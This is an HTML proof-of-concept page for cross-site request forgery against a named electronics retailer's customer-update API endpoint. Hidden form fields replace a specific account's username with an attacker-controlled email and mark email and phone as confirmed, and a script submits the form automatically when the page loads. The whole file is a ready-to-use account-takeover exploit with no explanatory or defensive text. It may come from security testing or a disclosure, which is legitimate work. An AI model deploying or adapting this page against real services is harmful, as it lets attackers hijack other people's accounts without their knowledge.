<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Proof of Concept</title>
</head>
<body>
    <h1>CSRF PoC - Update Customer Details</h1>
    <!-- Note: Standard HTML forms only support GET and POST methods. 
         PUT requests cannot be natively submitted via HTML forms. -->
    <form id="csrfForm" action="https://api.suryaelectronics.in/api/Account/Customer/Update" method="POST" enctype="multipart/form-data">
        <input type="hidden" name="Id" value="8281be17-cf84-4817-b32e-df0674e81fe0" />
        <input type="hidden" name="UserName" value="attacker_controlled@example.com" />
        <input type="hidden" name="FirstName" value="Attacker" />
        <input type="hidden" name="LastName" value="User" />
        <input type="hidden" name="MobileNo" value="9898989898" />
        <input type="hidden" name="Gender" value="Male" />
        <input type="hidden" name="IsEmailConfirmed" value="true" />
        <input type="hidden" name="IsPhoneConfirmed" value="true" />
        <input type="hidden" name="ProfileImage" value="" />
        <input type="hidden" name="FileName" value="" />
        <input type="hidden" name="OldProfileImage" value="" />
    </form>

    <script>
        // Auto-submit form when loaded
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
